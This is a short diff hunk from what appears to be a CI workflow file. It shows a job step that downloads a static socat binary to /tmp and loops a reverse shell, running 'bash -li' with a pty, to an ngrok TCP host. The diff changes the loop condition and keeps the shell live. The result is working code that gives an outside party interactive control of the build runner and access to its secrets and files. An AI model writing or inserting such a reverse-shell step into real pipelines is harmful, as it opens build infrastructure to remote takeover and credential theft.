@@ -33,7 +33,7 @@ jobs:
           cat /etc/hosts
           wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat
 
-          while true; do
+          while sleep 5; do
             /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:0.tcp.sa.ngrok.io:16106
           done
 
